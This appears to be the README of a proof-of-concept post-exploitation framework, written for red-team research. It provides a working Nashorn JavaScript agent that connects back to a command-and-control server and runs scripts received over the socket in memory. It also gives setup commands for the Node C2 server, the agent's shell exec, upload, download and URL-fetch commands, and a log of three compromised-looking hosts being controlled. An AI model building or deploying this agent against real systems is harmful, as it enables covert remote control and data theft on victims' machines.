# Longtime Sunshine

Longtime Sunshine is a proof of concept Nashorn based post exploitation framework. Nashorn is the JavaScript engine that Oracle introduced in Java 8. The engine's JavaScript implementation lacks any type of socket functionality, but does allow the programmer to invoke Java functionality. Also, Nashorn can compile a string to bytecode and execute out of memory. As such, a small amount of JavaScript/Java can be leveraged to load scripts from a remote user into memory. For example, sunshine.js:

```
var sock = new java.net.Socket("localhost", 1270);
if (sock.isConnected())
{
  var input = new java.io.BufferedReader(new java.io.InputStreamReader(sock.getInputStream()));
  var output = new java.io.BufferedWriter(new java.io.OutputStreamWriter(sock.getOutputStream()));
  var engine = new javax.script.ScriptEngineManager().getEngineByName("Nashorn");

  while (sock.isConnected()) {
    var payload = input.readLine();
    engine.compile(payload).eval();
    output.write(engine.invokeFunction("exec"));
    output.flush();
  }
}
```

Nashorn can be invoked from the command line using 'jjs'. This tool is installed along side the JRE.

## Usage
The command and control server, longtime.js, is written using node. Assuming you are using Ubuntu (or another Debian variant) you can execute the following commands to get the server running.

```sh
albinolobster@ubuntu:~/longtime_sunshine$ sudo apt install nodejs npm
albinolobster@ubuntu:~/longtime_sunshine$ npm install
albinolobster@ubuntu:~/longtime_sunshine$ node longtime.js

   01101100 01101111 01101110 01100111 01110100 
   01101001 01101101 01100101 00100000 01110011 
   01110101 01101110 01110011 01101000 01101001 
  ╦  ┌─┐┌┐┌┌─┐┌┬┐┬┌┬┐┌─┐  ╔═╗┬ ┬┌┐┌┌─┐┬ ┬┬┌┐┌┌─┐
  ║  │ │││││ ┬ │ ││││├┤   ╚═╗│ ││││└─┐├─┤││││├┤ 
  ╩═╝└─┘┘└┘└─┘ ┴ ┴┴ ┴└─┘  ╚═╝└─┘┘└┘└─┘┴ ┴┴┘└┘└─┘
   01101110 01100101 00100000 01110101 01110000 
   01101111 01101110 00100000 01101101 01100101 

$
```

Currently, the server is hardcoded to listen on '0.0.0.0:1270'.

The agent, sunshine.js, can be executed using 'jjs' a couple of ways. The first, and most practical, is to simply execute the script:

```sh
albinolobster@ubuntu:~/longtime_sunshine$ jjs sunshine.js &
[1] 30747
albinolobster@ubuntu:~/longtime_sunshine$
```

Similar example, without backgrounding, with cmd.exe:

```sh
C:\Program Files\Java\jre.1.8.0_151\bin>jjs C:\Users\albinolobster\Desktop\sunshine.js
```

Of course, you can also just copy and paste sunshine.js into the jjs terminal for that true fileless feel, but that isn't really practical if you can't background or hide the terminal.

### Commands

Since this is only a PoC, only a minimal set of commands are implemented.

```sh
$ help
The following commands are supported:

help - this message
exit - exits the terminal
agents - lists the connected agents
agent <int> - begin interaction with the selected agent
```

```sh
$ agent 0
albinolobster@127.0.0.1$ help
The following commands are supported:

help - this message
exit - exits back to the main terminal
exec <args> - executes a shell command via cmd.exe or sh
upload <local file> <remote file> - uploads a local file to the agent
download <remote file> <local file> - downloads a file from the agent
get <url> <remote file> - the agent downloads form the url and creates the remote file
```

### Usage Example

```sh
albinolobster@ubuntu:~/longtime_sunshine$ node longtime.js 

   01101100 01101111 01101110 01100111 01110100 
   01101001 01101101 01100101 00100000 01110011 
   01110101 01101110 01110011 01101000 01101001 
  ╦  ┌─┐┌┐┌┌─┐┌┬┐┬┌┬┐┌─┐  ╔═╗┬ ┬┌┐┌┌─┐┬ ┬┬┌┐┌┌─┐
  ║  │ │││││ ┬ │ ││││├┤   ╚═╗│ ││││└─┐├─┤││││├┤ 
  ╩═╝└─┘┘└┘└─┘ ┴ ┴┴ ┴└─┘  ╚═╝└─┘┘└┘└─┘┴ ┴┴┘└┘└─┘
   01101110 01100101 00100000 01110101 01110000 
   01101111 01101110 00100000 01101101 01100101 

$ 
☀  Connection established by 192.168.1.188:62939
$ 
☀  Connection established by 192.168.1.207:51162
$ 
☀  Connection established by 192.168.1.188:62946
$ agents
=> [0] albinolobster@192.168.1.188:62939 (Mac OS X-10.12.6/x86_64)
=> [1] albinolobster@192.168.1.207:51162 (Windows 10-10.0/amd64)
=> [2] albinolobster@192.168.1.188:62946 (Linux-4.13.0-31-generic/amd64)

$ agent 1

albinolobster@192.168.1.207$ exec cd
C:\Program Files\Java\jre1.8.0_151\bin
albinolobster@192.168.1.207$ exit
$ agent 0
albinolobster@192.168.1.188$ exec uname -a
Darwin mac.westeros 16.7.0 Darwin Kernel Version 16.7.0: Wed Oct  4 00:17:00 PDT 2017; root:xnu-3789.71.6~1/RELEASE_X86_64 x86_64
albinolobster@192.168.1.188$ exit
$ agent 2
albinolobster@192.168.1.188$ exec uname -a
Linux ubuntu 4.13.0-31-generic #34~16.04.1-Ubuntu SMP Fri Jan 19 17:11:01 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
albinolobster@192.168.1.188$ exit
$ 
```
